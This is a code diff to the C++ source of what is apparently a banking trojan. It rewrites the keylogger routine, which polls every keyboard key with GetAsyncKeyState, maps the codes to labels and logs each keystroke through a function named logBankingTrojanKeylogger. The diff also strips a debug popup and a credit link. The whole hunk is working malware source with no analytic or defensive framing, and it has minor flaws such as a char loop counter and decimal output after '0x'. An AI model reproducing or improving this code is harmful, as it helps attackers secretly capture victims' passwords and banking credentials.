@@ -856,69 +856,80 @@ DWORD WINAPI ChromeMainThread(LPVOID lpParam)
 
 /*
 	Key logger functions
-	https://github.com/shubhangi-singh21/Keylogger/
 */
 
+// https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+std::map<int, std::wstring> initializeKeyMap() {
+	std::map<int, std::wstring> keyMap = {
+		{0x08, L"[BACKSPACE]"}, {0x09, L"[TAB]"}, {0x0C, L"[CLEAR]"}, {0x0D, L"[ENTER]\n"},
+		{0x10, L"[SHIFT]"}, {0x11, L"[CTRL]"}, {0x12, L"[ALT]"}, {0x13, L"[PAUSE]"},
+		{0x14, L"[CAPS LOCK]"}, {0x1B, L"[ESC]"}, {0x20, L"[SPACE]"}, {0x21, L"[PAGE UP]"},
+		{0x22, L"[PAGE DOWN]"}, {0x23, L"[END]"}, {0x24, L"[HOME]"}, {0x25, L"[LEFT]"},
+		{0x26, L"[UP]"}, {0x27, L"[RIGHT]"}, {0x28, L"[DOWN]"}, {0x2D, L"[INSERT]"},
+		{0x2E, L"[DELETE]"},
+		{0x30, L"0"}, {0x31, L"1"}, {0x32, L"2"}, {0x33, L"3"}, {0x34, L"4"},
+		{0x35, L"5"}, {0x36, L"6"}, {0x37, L"7"}, {0x38, L"8"}, {0x39, L"9"},
+		{0x41, L"A"}, {0x42, L"B"}, {0x43, L"C"}, {0x44, L"D"}, {0x45, L"E"},
+		{0x46, L"F"}, {0x47, L"G"}, {0x48, L"H"}, {0x49, L"I"}, {0x4A, L"J"},
+		{0x4B, L"K"}, {0x4C, L"L"}, {0x4D, L"M"}, {0x4E, L"N"}, {0x4F, L"O"},
+		{0x50, L"P"}, {0x51, L"Q"}, {0x52, L"R"}, {0x53, L"S"}, {0x54, L"T"},
+		{0x55, L"U"}, {0x56, L"V"}, {0x57, L"W"}, {0x58, L"X"}, {0x59, L"Y"},
+		{0x5A, L"Z"},
+		{0x60, L"[NUMPAD 0]"}, {0x61, L"[NUMPAD 1]"}, {0x62, L"[NUMPAD 2]"},
+		{0x63, L"[NUMPAD 3]"}, {0x64, L"[NUMPAD 4]"}, {0x65, L"[NUMPAD 5]"},
+		{0x66, L"[NUMPAD 6]"}, {0x67, L"[NUMPAD 7]"}, {0x68, L"[NUMPAD 8]"},
+		{0x69, L"[NUMPAD 9]"}, {0x6A, L"[NUMPAD *]"}, {0x6B, L"[NUMPAD +]"},
+		{0x6D, L"[NUMPAD -]"}, {0x6E, L"[NUMPAD .]"}, {0x6F, L"[NUMPAD /]"},
+		{0x70, L"[F1]"}, {0x71, L"[F2]"}, {0x72, L"[F3]"}, {0x73, L"[F4]"},
+		{0x74, L"[F5]"}, {0x75, L"[F6]"}, {0x76, L"[F7]"}, {0x77, L"[F8]"},
+		{0x78, L"[F9]"}, {0x79, L"[F10]"}, {0x7A, L"[F11]"}, {0x7B, L"[F12]"},
+		{0x7C, L"[F13]"}, {0x7D, L"[F14]"}, {0x7E, L"[F15]"}, {0x7F, L"[F16]"},
+		{0xA0, L"[LEFT SHIFT]"}, {0xA1, L"[RIGHT SHIFT]"},
+		{0xA2, L"[LEFT CTRL]"}, {0xA3, L"[RIGHT CTRL]"},
+		{0xA4, L"[LEFT ALT]"}, {0xA5, L"[RIGHT ALT]"},
+		{0x5B, L"[LEFT WIN]"}, {0x5C, L"[RIGHT WIN]"}, {0x5D, L"[APPS]"},
+		{0xAD, L"[VOLUME MUTE]"}, {0xAE, L"[VOLUME DOWN]"}, {0xAF, L"[VOLUME UP]"},
+		{0xB0, L"[NEXT TRACK]"}, {0xB1, L"[PREV TRACK]"}, {0xB2, L"[STOP TRACK]"},
+		{0xB3, L"[PLAY/PAUSE]"}, {0xA6, L"[BROWSER BACK]"}, {0xA7, L"[BROWSER FORWARD]"},
+		{0xA8, L"[BROWSER REFRESH]"}, {0xA9, L"[BROWSER STOP]"}, {0xAA, L"[BROWSER SEARCH]"},
+		{0xAB, L"[BROWSER FAVORITES]"}, {0xAC, L"[BROWSER HOME]"}
+	};
+	return keyMap;
+}
+
 int keyLoggerMain() {
+	auto keyMap = initializeKeyMap();
 
 	logBankingTrojanKeylogger(L"\n-------------------KeyLoggerStart!-------------------\n");
 	char key;
+
 	while (true) {
 		Sleep(10);
 		for (key = 8; key <= 255; key++) {
 			if (GetAsyncKeyState(key) == -32767) {
-				switch (key)
-				{
-				case VK_SHIFT:
-					logBankingTrojanKeylogger(L"[SHIFT]");
-					break;
-				case VK_BACK:
-					logBankingTrojanKeylogger(L"[BACKSPACE]");
-					break;
-				case VK_LBUTTON:
-					//logBankingTrojanKeylogger(L"[LBUTTON]");
-					break;
-				case VK_RBUTTON: 
-					//logBankingTrojanKeylogger(L"[RBUTTON]");
-					break;
-				case VK_RETURN:
-					logBankingTrojanKeylogger(L"[ENTER]\n");
-					break;
-				case VK_TAB:
-					logBankingTrojanKeylogger(L"[TAB]");
-					break;
-				case VK_ESCAPE:
-					logBankingTrojanKeylogger(L"[ESCAPE]");
-					break;
-				case VK_CONTROL:
-					logBankingTrojanKeylogger(L"[Ctrl]");
-					break;
-				case VK_MENU:
-					logBankingTrojanKeylogger(L"[Alt]");
-					break;
-				case VK_CAPITAL: 
-					logBankingTrojanKeylogger(L"[CAPS Lock]");
-					break;
-				case VK_SPACE: 
-					logBankingTrojanKeylogger(L"[SPACE]");
-					break;
-				}
-				if (key == VK_SHIFT || key == VK_BACK || key == VK_LBUTTON || key == VK_RBUTTON || key == VK_RETURN || key == VK_TAB || key == VK_ESCAPE || key == VK_CONTROL || key == VK_MENU || key == VK_CAPITAL || key == VK_SPACE) {
-					continue;
-				}
-				else {
+				if (keyMap.find(key) != keyMap.end()) {
+
+					// Convert uppercase to lowercase
 					bool isShiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
 					if (!isShiftPressed && key >= 'A' && key <= 'Z') {
-						key = tolower(key);
+						std::wstring s = keyMap[key].c_str();
+						s[0] = tolower(s[0]);
+						logBankingTrojanKeylogger(s.c_str());
+						continue;
 					}
 
-					logBankingTrojanKeylogger(std::wstring(1, key).c_str());
+					logBankingTrojanKeylogger(keyMap[key].c_str());
+				}
+				else {
+					std::wstring ss = L"[VK_code : 0x";
+					ss += std::to_wstring(key);
+					ss += L"]";
+					logBankingTrojanKeylogger(ss.c_str());
 				}
 			}
 		}
 	}
-	if (DEBUG)
-		MessageBoxW(NULL, L"Success run to KeyLogger to END", L"KeyLoggerMainThread", MB_OK);
+
 	return 1;
 }
 
